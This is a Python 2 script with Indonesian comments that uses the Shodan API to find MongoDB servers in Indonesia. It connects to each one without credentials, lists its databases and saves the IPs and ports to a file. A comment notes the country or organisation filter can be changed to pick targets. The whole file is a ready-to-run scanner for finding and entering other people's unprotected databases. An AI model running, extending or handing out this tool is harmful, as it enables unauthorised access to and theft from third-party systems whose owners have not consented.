import pymongo
import sys
import os
import shodan
import time
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure

if len(sys.argv) < 2 :
	print "Use : python file.py [jumlah_ouput]"
	sys.exit()
print "\033[92m[~]Simple Tool to Get Unauth MongoDB Server[~]"

def get_shodan():
	if os.path.exists("./key.txt") and os.path.getsize("./key.txt") > 0 :
		with open("./key.txt","r") as key :
			api_key = key.readline().rstrip("\n")
	else:
		key = open("./key.txt","w") 
		api_key = raw_input("[+] type your api key [+]")
		key.write(api_key)
		print "[=] file saved in key.txt [=]"
		key.close

	get = shodan.Shodan(api_key)
	number = 0
	batas  = sys.argv[1]

	try:
		print "[+] Cek API Key [+]"
		get.search("product:MongoDB")
		print "[!] api cocok [!]"
		keyword = "product:MongoDB metrics country:ID" #rubah country untuk mendapatkan hasil spesifik negara atau juga bisa pake org untuk organisasi
		hasil = open("hasil-jos.txt","a") #append file
		for data in get.search_cursor(keyword): #modif result sesuai kebutuhan referesni https://developer.shodan.io/api/banner-specification
			number += 1
			print "NO : " + str(number)
			print "IP : " + (data["ip_str"])
			print "Port : "  + str(data["port"])
			print "Domains : " +  str(data["domains"])
			print "Hostnames : " + str(data["hostnames"])
			#print "Batas : " + str(batas)
			try:
				getdb = MongoClient(data["ip_str"],int(data["port"]))
				if getdb:
					print "List DB : " + str(getdb.database_names())
			except ConnectionFailure:
				print "Gak bisa connect ke DB boss . . . " 
				continue
			
			hasil.write("IP : " + data["ip_str"] + " port:" + str(data["port"]) + " hostnames : " + str(data["hostnames"]) +  "\n") # list db gak di write ke file males ngatur listnya wkwk
			if int(number) >= int(batas):
				raise KeyboardInterrupt

		hasil.close()

	except KeyboardInterrupt:
            print "\t\033[1;91m[!] bye"
            print "\n\t\033[1;91m[!] jangan lupa check hasil.txt"
            time.sleep(0.5)
            sys.exit(1)


if __name__ == "__main__":
	get_shodan()

